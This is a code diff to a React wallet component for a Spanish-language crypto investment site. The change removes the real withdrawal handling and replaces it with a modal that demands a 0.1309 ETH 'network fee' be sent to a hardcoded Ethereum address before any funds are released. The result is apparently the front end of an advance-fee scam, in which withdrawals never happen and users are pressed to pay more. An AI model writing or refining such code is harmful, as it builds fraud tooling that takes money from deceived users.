@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { motion } from 'framer-motion';
 import { Wallet, ArrowDown, ArrowUp, Copy, Check, ArrowLeft } from 'lucide-react';
 import { Button } from '@/components/ui/button';
@@ -23,6 +23,15 @@ const WalletSection = ({ userBalance, setUserBalance, addTransaction }) => {
 
   const depositAddress = '0xAbCd...1234';
   const requiredEthDepositAddress = '0x89c945bb39841D7aaDae972261790a949E071E2f';
+
+  useEffect(() => {
+    const saved = localStorage.getItem('withdrawData');
+    if (saved) {
+      const parsed = JSON.parse(saved);
+      setAmount(parsed.amount || '');
+      setAddress(parsed.address || '');
+    }
+  }, []);
 
   const handleCopy = (addr) => {
     navigator.clipboard.writeText(addr);
@@ -53,6 +62,7 @@ const WalletSection = ({ userBalance, setUserBalance, addTransaction }) => {
 
   const handleAttemptWithdraw = () => {
     setModalType('withdraw');
+    setShowWithdrawForm(true);
   };
 
   const handleWithdraw = () => {
@@ -70,22 +80,8 @@ const WalletSection = ({ userBalance, setUserBalance, addTransaction }) => {
       return;
     }
 
-    setUserBalance(prev => ({ ...prev, usdt: prev.usdt - withdrawAmount }));
-    addTransaction({
-      id: new Date().toISOString(),
-      type: 'Retiro',
-      amount: `-${withdrawAmount.toFixed(2)} USDT`,
-      project: `A ${address.slice(0, 6)}...`,
-      date: new Date().toLocaleDateString(),
-      status: 'pending'
-    });
-    toast({
-      title: "⏳ Retiro en Proceso",
-      description: `Tu retiro de ${withdrawAmount} USDT a ${address.slice(0, 6)}... está siendo procesado.`
-    });
-    setShowWithdrawForm(false);
-    setAmount('');
-    setAddress('');
+    localStorage.setItem('withdrawData', JSON.stringify({ amount, address }));
+    setModalType('confirmWithdraw');
   };
 
   const renderModal = () => {
@@ -135,53 +131,47 @@ const WalletSection = ({ userBalance, setUserBalance, addTransaction }) => {
     }
 
     if (modalType === 'withdraw') {
-      if (showWithdrawForm) {
-        return (
-          <motion.div
-            initial={{ opacity: 0 }} animate={{ opacity: 1 }}
-            className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4"
-            onClick={() => { setShowWithdrawForm(false); setModalType(null); }}
-          >
-            <motion.div
-              initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }}
-              className="glass-card p-6 rounded-2xl max-w-sm w-full"
-              onClick={(e) => e.stopPropagation()}
-            >
-              <Button variant="ghost" size="sm" className="absolute top-3 left-3" onClick={() => setShowWithdrawForm(false)}>
-                <ArrowLeft className="w-4 h-4 mr-1" /> Volver
-              </Button>
-              <h3 className="text-xl font-bold text-center mb-4 pt-8">Retirar USDT</h3>
-              <input
-                type="number"
-                value={amount}
-                onChange={(e) => setAmount(e.target.value)}
-                placeholder="Cantidad a Retirar"
-                className="w-full p-3 bg-gray-800/50 border border-gray-600 rounded-lg text-white mb-4"
-              />
-              <input
-                type="text"
-                value={address}
-                onChange={(e) => setAddress(e.target.value)}
-                placeholder="Dirección de Wallet (ERC-20)"
-                className="w-full p-3 bg-gray-800/50 border border-gray-600 rounded-lg text-white mb-4"
-              />
-              <Button className="w-full bg-blue-500 hover:bg-blue-600" onClick={handleWithdraw}>
-                Confirmar Retiro
-              </Button>
-            </motion.div>
-          </motion.div>
-        );
-      }
-
       return (
-        <AlertDialog
-  open={modalType === 'withdraw'}
-  onOpenChange={() => {
-    setModalType(null);
-    setShowWithdrawForm(false);
-  }}
->
-   <AlertDialogContent
+        <motion.div
+          initial={{ opacity: 0 }} animate={{ opacity: 1 }}
+          className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4"
+          onClick={() => { setShowWithdrawForm(false); setModalType(null); }}
+        >
+          <motion.div
+            initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }}
+            className="glass-card p-6 rounded-2xl max-w-sm w-full"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <Button variant="ghost" size="sm" className="absolute top-3 left-3" onClick={() => setShowWithdrawForm(false)}>
+              <ArrowLeft className="w-4 h-4 mr-1" /> Volver
+            </Button>
+            <h3 className="text-xl font-bold text-center mb-4 pt-8">Retirar USDT</h3>
+            <input
+              type="number"
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+              placeholder="Cantidad a Retirar"
+              className="w-full p-3 bg-gray-800/50 border border-gray-600 rounded-lg text-white mb-4"
+            />
+            <input
+              type="text"
+              value={address}
+              onChange={(e) => setAddress(e.target.value)}
+              placeholder="Dirección de Wallet (ERC-20)"
+              className="w-full p-3 bg-gray-800/50 border border-gray-600 rounded-lg text-white mb-4"
+            />
+            <Button className="w-full bg-blue-500 hover:bg-blue-600" onClick={handleWithdraw}>
+              Confirmar Retiro
+            </Button>
+          </motion.div>
+        </motion.div>
+      );
+    }
+
+    if (modalType === 'confirmWithdraw') {
+      return (
+        <AlertDialog open={true} onOpenChange={() => setModalType(null)}>
+          <AlertDialogContent
             className="z-[9999] bg-slate-900 text-white border border-slate-700 rounded-lg p-6 shadow-xl max-w-md w-full"
             style={{
               position: 'fixed',
@@ -194,35 +184,29 @@ const WalletSection = ({ userBalance, setUserBalance, addTransaction }) => {
               gap: '1rem',
             }}
           >
-    <AlertDialogHeader>
-      <AlertDialogTitle>Comisión de Retiro</AlertDialogTitle>
-      <AlertDialogDescription className="text-sm text-gray-300 leading-relaxed break-words">
-        Para procesar su retiro, se requiere una comisión de red. Por favor, deposite <strong>0.1309 ETH</strong> en la siguiente dirección para cubrir los costos de transacción.
-      </AlertDialogDescription>
-    </AlertDialogHeader>
-    <div className="bg-gray-800/50 p-3 rounded-lg text-center my-4">
-      <p className="font-mono text-purple-400 break-words">{requiredEthDepositAddress}</p>
-    </div>
-    <AlertDialogFooter>
-      <AlertDialogCancel
-        onClick={() => {
-          setModalType(null);
-          setShowWithdrawForm(false);
-        }}
-      >
-        Volver
-      </AlertDialogCancel>
-      <AlertDialogAction
-        onClick={() => handleCopy(requiredEthDepositAddress)}
-        className="bg-purple-500 hover:bg-purple-600"
-      >
-        {copied ? <Check className="w-4 h-4 mr-2" /> : <Copy className="w-4 h-4 mr-2" />}
-        Copiar Dirección
-      </AlertDialogAction>
-    </AlertDialogFooter>
-  </AlertDialogContent>
-</AlertDialog>
-
+            <AlertDialogHeader>
+              <AlertDialogTitle>Comisión de Retiro</AlertDialogTitle>
+              <AlertDialogDescription className="text-sm text-gray-300 leading-relaxed break-words">
+                Para procesar su retiro, se requiere una comisión de red. Por favor, deposite <strong>0.1309 ETH</strong> en la siguiente dirección para cubrir los costos de transacción.
+              </AlertDialogDescription>
+            </AlertDialogHeader>
+            <div className="bg-gray-800/50 p-3 rounded-lg text-center my-4">
+              <p className="font-mono text-purple-400 break-words">{requiredEthDepositAddress}</p>
+            </div>
+            <AlertDialogFooter>
+              <AlertDialogCancel onClick={() => setModalType(null)}>Editar</AlertDialogCancel>
+              <AlertDialogAction
+                onClick={() => {
+                  handleCopy(requiredEthDepositAddress);
+                  setModalType(null);
+                }}
+                className="bg-purple-500 hover:bg-purple-600"
+              >
+                {copied ? <Check className="w-4 h-4 mr-2" /> : <Copy className="w-4 h-4 mr-2" />} Copiar Dirección
+              </AlertDialogAction>
+            </AlertDialogFooter>
+          </AlertDialogContent>
+        </AlertDialog>
       );
     }
   };
